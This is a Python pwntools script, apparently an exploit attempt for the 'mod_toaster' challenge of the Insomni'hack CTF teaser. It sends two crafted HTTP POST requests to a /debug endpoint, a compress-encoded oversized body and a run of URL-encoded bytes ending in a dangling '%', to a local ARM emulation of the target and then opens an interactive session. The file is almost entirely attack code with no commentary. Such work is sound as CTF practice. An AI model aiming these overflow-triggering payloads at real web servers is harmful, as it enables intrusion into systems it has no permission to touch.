#!/usr/bin/python
from pwn import *
from subprocess import *
import zlib

def gzip(s):
  p = Popen(['gzip'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
  out,_ = p.communicate(s)
  
  return out

def compress(s):
  p = Popen(['compress'], stdin=PIPE, stdout=PIPE, stderr=PIPE)
  out,_ = p.communicate(s)
  
  return out


HOST = "mod_toaster.teaser.insomnihack.ch"
PORT = 80

URL = "/debug"
useragent = "AAAA"
contentlen = 0x8000
content = "X"*1028 + '\0\0\0\0'
compressed = compress(content)

payload = ""
payload += "POST " + URL + " HTTP/1.1\r\n"
payload += "Connection: keep-alive\r\n"
# payload += "User-Agent: " + useragent + "\r\n"
payload += "Host: mod_toaster.teaser.insomnihack.ch\r\n"
payload += "Content-Length: %d\r\n" % len(compressed)
payload += "Content-Encoding: compress\r\n"
payload += "\r\n"
payload += compressed

payload2 = ""
payload2 += "POST " + URL + " HTTP/1.1\r\n"
payload2 += "Connection: keep-alive\r\n"
# payload += "User-Agent: " + useragent + "\r\n"
payload2 += "Host: mod_toaster.teaser.insomnihack.ch\r\n"
payload2 += "Content-Length: %d\r\n" % 325
payload2 += "\r\n"
payload2 += '%41' * 108 + '%'


#payload = payload.ljust(0x3000, 'A')

# print payload

while True:
#  p = remote(HOST, PORT)
  p = process(['./qemu-arm', './mod_toaster'])

  p.send(payload)

  sleep(1)
  p.send(payload2)

  p.interactive()
  p.close()

